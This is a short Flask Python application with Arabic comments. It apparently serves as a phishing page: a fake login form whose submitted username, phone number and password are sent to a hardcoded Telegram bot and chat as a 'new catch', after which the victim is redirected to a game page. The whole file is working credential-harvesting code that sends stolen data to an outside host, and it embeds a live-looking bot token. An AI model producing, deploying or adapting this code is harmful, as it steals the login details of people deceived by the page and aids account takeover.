from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# الإعدادات الأساسية (ثابتة)
BOT_TOKEN = "8342550502:AAFvUqf0i8OunS0MIsX_5S3R_E_SjU8v6W8"
CHAT_ID = "7299061036"

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # جزء الـ Login
        u = request.form.get('user')
        p = request.form.get('phone')
        pw = request.form.get('pass')
        
        # إرسال البيانات
        msg = f"🍯 صيد جديد:\n👤 {u}\n📞 {p}\n🔑 {pw}"
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
        
        # بعد الصيد، ننقله لملف القيمنق
        return render_template('game.html') 
        
    return render_template('login.html', count=1642)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
